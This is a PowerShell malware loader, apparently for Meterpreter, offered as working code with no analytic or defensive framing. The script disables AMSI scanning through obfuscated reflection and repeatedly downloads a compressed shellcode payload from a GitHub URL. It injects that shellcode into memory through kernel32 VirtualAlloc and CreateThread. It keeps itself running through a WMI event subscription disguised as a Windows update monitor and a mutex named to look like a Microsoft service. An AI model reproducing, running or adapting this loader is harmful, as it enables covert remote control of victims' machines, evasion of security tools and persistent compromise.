# === IMMORTAL FILELESS METERPRETER LOADER ===
# AMSI Bypass (polymorphic)
[Ref].Assembly.GetType(('System.Manage'+'ment.Automation.Am'+'siUtils')).GetField(('amsiInitF'+'ailed'),('NonPublic,Sta'+'tic')).SetValue($null,$true)

# Memory-based persistent downloader
function Invoke-PhantomLoader {
    $url = "https://github.com/mitasahi/root/raw/refs/heads/main/ps-persist.ps1.tar.gz"
    $arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
    
    do {
        try {
            # In-memory download and extraction
            $web = New-Object Net.WebClient
            $tarData = $web.DownloadData($url)
            $ms = New-Object IO.MemoryStream(,$tarData)
            $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
            $msOutput = New-Object IO.MemoryStream
            $gz.CopyTo($msOutput)
            $rawBytes = $msOutput.ToArray()
            
            # Extract shellcode from TAR
            $scBase64 = [Text.Encoding]::UTF8.GetString($rawBytes).Split("|") | 
                        Where-Object { $_ -match "$arch|global" } |
                        Select-Object -Index 0
            [byte[]]$sc = [Convert]::FromBase64String($scBase64)
            
            # Memory injection
            $code = @"
                using System;
                using System.Runtime.InteropServices;
                public class Inject {
                    [DllImport("kernel32")] 
                    public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
                    [DllImport("kernel32")] 
                    public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
                }
"@
            Add-Type $code -WarningAction SilentlyContinue
            $mem = [Inject]::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
            [Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
            [Inject]::CreateThread(0, 0, $mem, 0, 0, 0) | Out-Null
            
            # Regenerate persistence
            Initialize-Phoenix
        }
        catch { Start-Sleep -Seconds 57 }
        finally { 
            $web.Dispose()
            Remove-Variable web,ms,gz,msOutput,rawBytes -Force
        }
    } while ($true)
}

# Self-healing persistence
function Initialize-Phoenix {
    # WMI Event Subscription
    $filterArgs = @{
        EventNamespace = 'root\cimv2'
        Name = 'WindowsUpdateMonitor'
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
        QueryLanguage = 'WQL'
    }
    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs

    $consumerArgs = @{
        Name = 'WindowsUpdateExecutor'
        CommandLineTemplate = "powershell.exe -NoP -C `"Invoke-PhantomLoader`""
    }
    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

    $bindingArgs = @{
        Filter = $filter
        Consumer = $consumer
    }
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs | Out-Null

    # Mutex-based anti-kill
    $antiKill = @"
        using System;
        using System.Runtime.InteropServices;
        public class Guardian {
            [DllImport("kernel32")]
            public static extern IntPtr CreateMutex(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);
        }
"@
    Add-Type $antiKill
    [Guardian]::CreateMutex(0, $true, "Global\MSFT_UpdateService") | Out-Null
}

# Eternal persistence loop
Invoke-PhantomLoader
